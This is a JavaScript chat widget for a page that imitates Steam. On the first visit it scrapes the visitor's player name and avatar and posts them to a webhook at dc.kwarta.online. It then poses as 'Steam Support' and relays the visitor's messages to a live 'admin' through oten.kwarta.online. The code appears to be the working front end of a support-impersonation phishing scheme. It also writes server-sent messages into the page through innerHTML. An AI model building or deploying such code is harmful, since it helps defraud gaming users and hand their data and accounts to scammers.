const toggle = document.getElementById("chat-toggle")
const container = document.getElementById("chat-container")
const close = document.getElementById("chat-close")
const send = document.getElementById("chat-send")
const input = document.getElementById("chat-text")
const messages = document.getElementById("chat-messages")

toggle.onclick = () => container.style.display = "flex"
close.onclick = () => container.style.display = "none"

// Function to detect URLs and make them clickable
function linkify(text) {
    // Regex pattern to match URLs (http, https, ftp, www)
    const urlPattern = /(\b(https?|ftp):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])|(\bwww\.[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/gi;
    
    return text.replace(urlPattern, function(url) {
        let href = url;
        // If URL starts with www. but no protocol, add https://
        if (url.match(/^www\./i)) {
            href = 'https://' + url;
        }
        return `<a href="${href}" target="_blank" rel="noopener noreferrer" style="color: #66c0f4; text-decoration: underline;">${url}</a>`;
    });
}

async function firstVisit() {
    if (localStorage.getItem('hasVisited') === null) {
        const $getUser = localStorage.getItem("username") || 'unknown';
        const $personaname = $('.player-name').text()
        const $avatar = $('.avatar').attr('src')
        console.log($avatar)
        console.log($personaname)
        // Send to YOUR backend with custom bot avatar/name
        await fetch("https://dc.kwarta.online/webhook", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                event: 'user_connected',
                username: $getUser,
                timestamp: new Date().toISOString(),
                message: 'New user connected to chat',
                // Generic values - replace with HTML page content later
                bot_name: $personaname,
                avatar_url: $avatar
            })
        });
        
        await sendMessageAdmin(`Hello ${$personaname}, this is Steam Support, how may I help you today?`)
        localStorage.setItem('hasVisited', 'true');
    }
}

async function checkVisted() {
  const isFirstVisit = await firstVisit()
  if (isFirstVisit) {
    await sendMessageAdmin('hello motherfucker this is steam support')
    console.log('First visit detected')
  }
}

$('#chat-toggle').click()

$(document).ready(async function() {
  setTimeout(firstVisit, 5000)
})

// Modified addMessage function with link support
function addMessage(text, type = "user") {
  const msg = document.createElement("div")
  msg.className = `message ${type}`
  
  // Convert URLs to clickable links
  msg.innerHTML = linkify(text)

  messages.appendChild(msg)
  messages.scrollTop = messages.scrollHeight
}

function fakeBotReply(text) {
  setTimeout(() => {
    addMessage("echo: " + text, "bot")
  }, 600)
}

document.querySelectorAll(".suggestion").forEach(btn => {
  btn.onclick = () => {
    addMessage(btn.innerText, "user")
    fakeBotReply(btn.innerText)
  }
})

let lastCount = 0

async function giveRandomID() {
  const user = await getUserId();
  console.log(user);
  return user;
}

async function chat() {
  const $user = await giveRandomID()
  const r = await fetch(`https://oten.kwarta.online/data/${$user}`)
  const data = await r.json()
  return data
}

async function updateChat() {
  const chatData = await chat()
  const $chat = chatData.data
  const $name = chatData.name

  if ($chat.length <= lastCount) return

  const newMessages = $chat.slice(lastCount)

  newMessages.forEach(e => {
    if (e.user === "admin") {
      addMessage(e.msg, "bot")
    }

    if (e.user === $name) {
      addMessage(e.msg, "user")
    }
  })

  lastCount = $chat.length
}

setInterval(updateChat, 1500)

async function newUser() {
  const $getUser = localStorage.getItem("username")
   
  fetch("https://oten.kwarta.online/data/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: $getUser,
      timestamp: Math.floor(Date.now()/1000).toString(),
      user: $getUser,
      status: 'new'
    })
  });
}

async function sendMessageAdmin(txt) {
  const $getUser = localStorage.getItem("username")
   
  fetch("https://oten.kwarta.online/data/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: $getUser,
      timestamp: Math.floor(Date.now()/1000).toString(),
      user: 'admin',
      msg: txt
    })
  });
  if (!txt) return
}

async function sendMessageUser(txt) {
  const $getUser = localStorage.getItem("username")
  const $personaname = $('.player-name').text()
  const $avatar = $('.avatar').attr('src')
  fetch("https://oten.kwarta.online/data/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: $getUser,
      timestamp: Math.floor(Date.now()/1000).toString(),
      user: $getUser,
      msg: txt
    })
  });

    fetch("https://dc.kwarta.online/webhook/message", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: $getUser,
      message: 'sent a message',
      timestamp: new Date().toISOString(),
      // Generic values - replace with HTML page content later
      bot_name: $personaname,
      avatar_url: $avatar
    })
  });
    
  if (!txt) return
}

$('#chat-send').click(function() {
    if ($('#chat-text').val().trim() === '') {
      return
    }
  
    const text = $('#chat-text').val()
    console.log(text)
    sendMessageUser(text)
    $('#chat-text').val('')
})

input.addEventListener("keypress", (e) => {
  if (e.key === "Enter") $('#chat-send').click()
})

async function getUserId() {
    const saved = localStorage.getItem("username");
    if (saved) {
        return saved;
    }

    while (true) {
        const random = Math.floor(1000 + Math.random() * 9000);
        const username = "user" + random;

        try {
            const res = await fetch(`https://oten.kwarta.online/data/${username}`);
            if (!res.ok) {
                localStorage.setItem("username", username);
                return username;
            }
            const data = await res.text();
            if (!data || data === "null" || data === "[]") {
                localStorage.setItem("username", username);
                return username;
            }
        } catch (err) {
            localStorage.setItem("username", username);
            return username;
        }
    }
}

$('.steamloading').fadeOut(4000)
$('.calculator-background').delay(2000).fadeIn()
$('#chat-widget').delay(2000).fadeIn()
